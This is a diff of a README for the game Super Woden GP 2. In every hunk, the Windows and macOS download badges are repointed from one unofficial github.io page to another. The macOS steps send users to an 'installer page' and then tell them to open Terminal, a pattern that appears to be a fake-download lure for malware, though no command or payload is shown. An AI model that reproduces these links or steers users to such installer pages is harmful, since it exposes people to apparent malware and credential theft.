@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Download Super Woden GP 2](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP%202-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download Super Woden GP 2](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP%202-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -65,9 +65,9 @@ Super Woden GP 2 is a retro top-down racing game inspired by classic arcade race
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 </div>
 
@@ -85,7 +85,7 @@ Super Woden GP 2 is a retro top-down racing game inspired by classic arcade race
 
 <div align="center">
 
-[![⬇ Download Super Woden GP 2](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP%202-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download Super Woden GP 2](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP%202-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
@@ -117,7 +117,7 @@ Super Woden GP 2 is a retro top-down racing game inspired by classic arcade race
 
 ## 🍎 macOS Installation
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -142,7 +142,7 @@ Super Woden GP 2 is a retro top-down racing game inspired by classic arcade race
 
 <div align="center">
 
-[![⬇ Download Super Woden GP 2](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP%202-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
+[![⬇ Download Super Woden GP 2](https://img.shields.io/badge/⬇_Download_Super%20Woden%20GP%202-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
 
 </div>
 
